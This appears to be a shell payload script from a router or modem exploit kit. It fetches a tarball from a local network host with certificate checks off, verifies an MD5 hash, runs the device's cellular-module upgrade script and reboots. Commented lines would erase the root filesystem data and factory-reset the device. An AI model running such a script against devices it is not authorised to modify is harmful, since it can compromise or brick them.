#!/bin/sh

echo "Downloading Files"
wget --no-check-certificate http://192.168.1.5/ro51v123exploit/swd.tar.gz -O /tmp/swd.tar.gz
hash=$(md5sum /tmp/swd.tar.gz | awk '{print $1}')
expected_hash='d96764cbf6b08521ed7944d58b0caba1'

echo "$hash = $expected_hash"

if [ "$hash" = "$expected_hash" ]; then
    echo 1 > /sys/class/leds/reset_cp/shot
    sh /lib/cp_upgrade/swdl_linux_notion.sh
    sleep 10
    echo 1 > /sys/class/leds/reset_cp/shot
    # mtd erase rootfs_data
    # ubus call router router_call_rst_factory 2> /dev/null
    reboot
else
    echo "Not same!"
fi

